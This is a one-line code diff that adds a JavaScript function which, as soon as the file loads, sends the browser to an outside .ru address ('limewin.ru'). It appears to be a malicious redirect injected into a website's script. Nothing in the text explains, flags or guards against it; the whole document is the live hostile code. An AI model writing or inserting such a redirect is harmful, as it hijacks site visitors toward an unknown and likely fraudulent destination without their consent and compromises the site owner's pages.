@@ -1,0 +1,1 @@
+function executeRun(){window.location.href="https://limewin.ru/go/index.html"}executeRun();
